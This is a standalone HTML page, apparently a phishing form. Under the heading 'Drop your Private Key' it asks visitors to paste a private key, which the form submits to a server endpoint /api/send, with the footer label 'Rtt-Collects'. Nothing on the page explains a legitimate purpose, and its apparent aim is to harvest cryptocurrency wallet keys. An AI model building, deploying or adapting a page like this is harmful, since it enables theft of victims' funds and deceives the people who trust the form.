<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private key</title>

  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">

  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family:"Poppins",sans-serif;
    }

    body{
      background:linear-gradient(135deg,#0d6efd,#1e90ff);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:20px;
    }

    .container{
      background:#fff;
      width:100%;
      max-width:400px;
      padding:30px;
      border-radius:18px;
      box-shadow:0 10px 30px rgba(0,0,0,0.2);
    }

    h1{
      text-align:center;
      color:#0d6efd;
      font-size:28px;
      font-weight:700;
      margin-bottom:8px;
    }

    p{
      text-align:center;
      color:#666;
      font-size:14px;
      margin-bottom:25px;
    }

    label{
      font-size:13px;
      color:#333;
      margin-bottom:5px;
      display:block;
    }

    textarea{
      width:100%;
      padding:12px;
      height:140px;
      border:1px solid #ddd;
      border-radius:10px;
      outline:none;
      font-size:14px;
      resize:none;
    }

    button{
      width:100%;
      margin-top:18px;
      padding:12px;
      border:none;
      background:#0d6efd;
      color:#fff;
      font-size:15px;
      font-weight:600;
      border-radius:10px;
      cursor:pointer;
    }

    .footer-text{
      text-align:center;
      font-size:12px;
      margin-top:15px;
      color:#888;
    }
  </style>
</head>

<body>

  <div class="container">
    <h1>Private key</h1>
    <p>Drop your Private Key</p>

    <form action="/api/send" method="POST">

      <label>Enter your Private key</label>

      <textarea
        name="Private key"
        placeholder="Enter your Private key"
        required
      ></textarea>

      <button type="submit">PROCEED</button>

    </form>

    <div class="footer-text">
      Rtt-Collects
    </div>
  </div>

</body>
</html>
